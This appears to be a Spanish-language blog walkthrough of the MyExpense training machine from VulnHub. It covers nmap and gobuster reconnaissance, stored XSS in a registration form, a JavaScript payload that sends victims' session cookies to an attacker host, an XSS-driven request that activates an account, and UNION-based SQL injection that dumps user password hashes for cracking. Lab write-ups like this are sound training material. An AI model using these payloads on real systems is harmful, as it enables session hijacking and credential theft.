---
title: Laboratorio practico de XSS(MyExpense)
date: 2025-05-29 19:20:00 -0300
categories: [Web Security, Vulnerabilidades, vulnhub]
tags: [xss, web, inyeccion, seguridad-web, fundamentos, javascript, lab]
description: >-
 Resolviendo maquina de vulnhub con distintas vulnerabilidades web
image:
  path: /assets/imgs/gato_hacker.jpg # Ruta a tu imagen de vista previa (1200x630px)
  alt: Explotando el XSS
toc: true # Activa la tabla de contenidos para este post
comments: false # Habilita comentarios para este post
---

En este post voy a estar documentando la resolucion de una maquina de [Vulnhub](https://vulnhub.com/) poniendo en practica lo aprendido en el post anterior

La maquina que vamos a auditar es [MyExpense](https://www.vulnhub.com/entry/myexpense-1,405/)


# Descripcion de la maquina: 

"MyExpense es una aplicación web deliberadamente vulnerable que te permite entrenar en la detección y explotación de diferentes vulnerabilidades web. A diferencia de una aplicación de "desafío" más tradicional (que te permite entrenar en una única vulnerabilidad específica), MyExpense contiene un conjunto de vulnerabilidades que necesitas explotar para lograr el escenario completo."

# Escenario:

Eres "Samuel Lamotte" y acabas de ser despedido de tu empresa, "Furtura Business Informatique". Desafortunadamente, debido a tu apresurada partida, no tuviste tiempo de validar tu informe de gastos de tu último viaje de negocios, el cual asciende a 750 € correspondientes a un vuelo de ida y vuelta para visitar a tu último cliente.

Temiendo que tu antiguo empleador no quiera reembolsarte este informe de gastos, decides hackear la aplicación interna llamada "MyExpense" para gestionar los informes de gastos de los empleados.

Así que estás en tu auto, en el estacionamiento de la empresa y conectado a la red Wi-Fi interna (la clave aún no ha sido cambiada después de tu partida). La aplicación está protegida por autenticación de usuario y contraseña, y esperas que el administrador aún no haya modificado o eliminado tu acceso.

Tus credenciales eran: **samuel/fzghn4lw**

Una vez que completes el desafío, la bandera (flag) se mostrará en la aplicación mientras estés conectado con tu cuenta (samuel).

# Fase de reconocimiento

## Ping 

Con un ping a la direccion ip de la maquina podemos saber que sistema operativo esta corriendo mirando el ttl que nos devuelve

![ping](/assets/imgs/my_expense_1.png)

En este caso devuelve 64, eso significa que la maquina esta corriendo alguna versíon de linux.

## Escaneo de puertos:

Voy a estar usando un escaneo de tipo sigiloso con nmap para averiguar que puertos estan abiertos en la maquina.



```sh 
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.101.150 -oG puertos
```

![nmap](/assets/imgs/my_expense_2.png)

### Verificando la version de los servicios:

Una vez que tenemos la informacion de los puertos abiertos lo que corresponde sería averiguar que servicios y que versiones de esos servicios se estan corriendo en la maquina.

```sh 
nmap -sCV -p80,32773,39678,53395,55153 192.168.101.150 -oN targets
```

![nmap_2](/assets/imgs/my_expense_3.png)


> Es una buena practica guardar el output de la consola como envidencia, sen este caso lo estamos haciendo con el parametro -oG y -oN
{: .prompt-info }

## Descubrimiento de directorios y archivos existentes en la Web

Voy a usar fuzzing para tratar de descubrir directorios y archivos existentes en la Web

Con la herramienta **gobuster** podemos aplicar el comando **dir** para aplicar un reconocimiento de fuerza bruta usando un diccionario.

```sh 
gobuster dir -u http://ip-target -w diccionario.txt -t 20
```

![gobuster](/assets/imgs/my_expense_4.png)

podemos ver que se encuentra un directorio llamado ***/admin***

> El fuzzing es una técnica de prueba de software que implica enviar datos aleatorios, a veces inválidos o malformados, a una aplicación para detectar errores, vulnerabilidades y problemas de seguridad
{: .prompt-info }

### Archivos bajo el directorio ***admin/***

Como pudimos observar existe un directorio admin al cual no tenemos acceso, sabiendo que la pagina ejecuta php de fondo podemos hacer una busqueda de archivos con esta extencion para obtener mas informacion de la pagina.


![gobuster](/assets/imgs/my_expense_5.png)

Descubrimos un archivo llamado con nombre ***admin.php*** vamos a ver que tiene

![admin_panel](/assets/imgs/my_expense_6.png)

podemos ver una especie de panel con usuario y sus respectivos cargos, ademas de informacion sobre el estado de las cuentas, como podemos ver la nuestra (slamotte) esta inactiva, logearse no es una opcion.

vamos a tratar de registrarnos.

## Explotacion Web

En el momento de registrar una nueva cuenta podemos ver que no podemos clickear el boton de "sign up!" esto es porque esta deshabilidado desde el codigo html de la pagina, podemos habilitarlo borrando el bloqueo que existe a nivel de etiquetas html usando la herramienta de inspeccionar del propio navegador.

![admin_panel](/assets/imgs/my_expense_7.png)

Borrando la linea "disabled" ya podriamos registrar una nueva cuenta.

![admin_panel](/assets/imgs/my_expense_8.png)

Podemos ver que la cuenta se creó correctamente, pero no podemos ingresar porque esta se encuentra inactiva:

![admin_panel](/assets/imgs/my_expense_9.png)

Por lo tanto podriamos aprovecharnos del propio formulario de registro para tratar de inyectar codigo javascript

![admin_panel](/assets/imgs/my_expense_10.png)c

Ahora solo nos quedaria consultar el archivo admin.php para que nuestro script se ejecute.

![admin_panel](/assets/imgs/my_expense_11.png)

ahora sabemos que la pagina es vulnerable a este tipo de ataque.

### Secuestro de cookies

En esta situacion lo que podemos intentar hacer es levantar un servidor http con un payload que se encargue de secuestrar las cookies de algun usuario con cuenta activa que este revisando la pagina.

para hacer esto podriamos hacer uso de un script en javascript externo, conociendo que se puede inyectar codigo javascript podriamos hacer uso de este script para hacer que la maquina victima consuma un recurso de nuestra maquina local en este caso un archivo javascript con el nombre de pwned.js

para hacerlo podriamos inyectar esta linea de codigo en el formulario de registro

```js
<script src="http://ip-atacante/pwned.js"></script>
```

pwned.js

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://ip-atacante/?=' + document.cookie);
request.send();
```

Cuando el usuario ingrese a la pagina nos enviaria su cookie de sesíon sin saberlo

![admin_panel](/assets/imgs/my_expense_12.png)


Ahora solo quedaría reemplazar nuestra cookie actual por la que acabamos de secuestrar.

![admin_panel](/assets/imgs/my_expense_13.png)


Despues cambiar nuestras cookies por las que acabamos de obtener y si nos dirigimos al panel admin.php que veíamos antes vamos a ver algo como esto:

![admin_panel](/assets/imgs/my_expense_14.png)

En este caso podemos ver que la pagina no es vulnerable a secuestros de cookie, pero podemos aprovechar los privilegios de administrador para que active alguna cuenta por nosotros.

Si vamos al panel admin.php y tratamos de activar alguna cuenta podemos ver que la peticion que se realiza por atras es algo como esto:

```
http://ip-victima/admin/admin.php?id=15&status=active
```

Si logramos hacer esta peticion GET con un usuario privilegiado entonces podríamos activar nuestra cuenta.

Para lograr esto podriamos reutilzar el payload anterior para que en vez de que consuma un recurso en de forma local a nuestro servidor, este haga la peticion que activa la cuenta por nosotros sin que se de cuenta.

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.101.150/admin/admin.php?id=11&status=active');
request.send();
```

Si todo sale bien vamos a ver algo como esto

![](/assets/imgs/my_expense_15.png)

Ahora nos dirigimos al panel admin.php y podemos ver como efectivamente ahora la cuenta slamotte se encuentra activa :) 

![](/assets/imgs/my_expense_16.png)

Ahora podemos tratar de logearnos.

![](/assets/imgs/my_expense_17.png)

ya estamos logeados como el usuario Samuel Lamotte.


En el apartado "Expense reports" podemos ver el ticket que nunca fue enviado

![](/assets/imgs/my_expense_18.png)

Podemos darle a submit para hacer que ingrese al sistema, pero solo eso, ahora alguien con mas privilegios deberia aprobar este ticket para que obtengamos el reembolso.

![](/assets/imgs/my_expense_19.png)

Si miramos nuestro panel de usuario podemos observar que tenemos a un tal "Manon Riviere" este usuario es quien tendría que aprobar nuestro rembolso.

![](/assets/imgs/my_expense_20.png)

Podemos ver que tenemos un chat en donde este usuario esta interactuando, podriamos intentar secuestrar sus cookies y asi nosotros mismos aprobar este ticket.

Si hay dudas de como podriamos hacer este ataque revisar [Este apartado](http://localhost:4000/posts/cross-site-scripting-vulnhub/#intento-de-secuestro-de-cookies)

> En el momento de crear el servidor http recomiendo cambiar de puerto para que no entre en conflicto con los ataques anteriores.
{: .prompt-info }

Enviamos el payload y esperamos a que los usuarios visiten la pagina.

![](/assets/imgs/my_expense_21.png)

Ahora podemos ver que estan realizando peticiones GET a nuestro servidor con sus cookies de sesíon

![](/assets/imgs/my_expense_22.png)

Ahora si utilizamos sus cookies podemos ver como cambia el usuario a Manon Riviere y tenemos dos nuevos apartados "Rennes" y "Expense Reports"

![](/assets/imgs/my_expense_23.png)

Como somos un usuario con mas privilegios que samuel ahora podemos validar este ticket de rembolso, pero ahora alguien tiene que aceptar este ticket.

![](/assets/imgs/my_expense_24.png)

Repetimos el paso anterior, vamos a nuestro perfil de usuario aprovechandonos de la informacion publica y miramos quien es el supervisor.

![](/assets/imgs/my_expense_25.png)


Nuestro supervisor en este caso es "Paul Boudouin" averiguemos como podemos obtener acceso a su cuenta ya que su cooki de sesíon no se encontraba entre las que secuestramos.

## SQLI

Podemos intentar ver si la pagina es vulnerable a SQLI

![](/assets/imgs/my_expense_26.png)

Por el comportamiento de la pagina confirmamos que es vulnerable a ataques SQLI

### Averiguando el numero total de columnas en la base de datos

Podemos aprovechar el mensaje de error para saber cuantos numeros de columnas existen en la base de datos(spoiler son 2 columnas)

```sql
http://192.168.101.150/site.php?id=2 order by 2-- -'
```

### Base de datos
Listando las bases de datos existentes.

```sql
http://192.168.101.150/site.php?id=2 union select 1, schema_name from information_schema.schemata-- -'
```

![](/assets/imgs/my_expense_27.png)

### Listando el contenido de la base de datos

```sql
http://192.168.101.150/site.php?id=2 union select 1, table_name from information_schema.tables where table_schema='myexpense'-- -
```
![](/assets/imgs/my_expense_28.png)

Existe una tabla "users" en la que seguramente se guarden los usuarios y contraseñas, vamos a ver.

### Listando la tabla user

```sql
http://192.168.101.150/site.php?id=2 union select 1, column_name from information_schema.columns where table_schema='myexpense' and table_name = "user"-- -
```
![](/assets/imgs/my_expense_29.png)

Encontramos la tabla en donde se guardan los usuarios y contraseñas, vamos a listarlas para ver lo que tienen.

### Listando usuarios y contraseña

```sql
http://192.168.101.150/site.php?id=2 union select 1, group_concat(username,0x3a,password) from user-- -
```

![](/assets/imgs/my_expense_30.png)

Esto nos devuelve todos los usuarios y sus contraseñas hasheadas :)

## Crackeando Hashes

Necesitamos la contraseña de quien en este caso podria aprobar nuestro rembolso, este usuario es ***pbaudouin*** asi que vamos a ver si podemos crackear el hash de su contraseña.

Esto se puede hacer de forma local o online, en mi caso voy a usar el metodo online usando [hashes.com](hashes.com)


![](/assets/imgs/my_expense_31.png)

La contraseña del usuario ***pbaudouin*** es ***HackMe*** 


## Aprobando el ticket

Una vez que tenemos la contraseña del supervisor solo nos quedaría logearnos y aprobar el ticker de reembolso.

![](/assets/imgs/my_expense_32.png)



## Capturando el Flag
Esta maquina de forma automatica detecta cuando se hizo todo bien y al momento de logearnos de nuevo como el usuario samuel nos va a mostrar la flag en el apartado "Expense Reports".

![](/assets/imgs/my_expense_33.png)


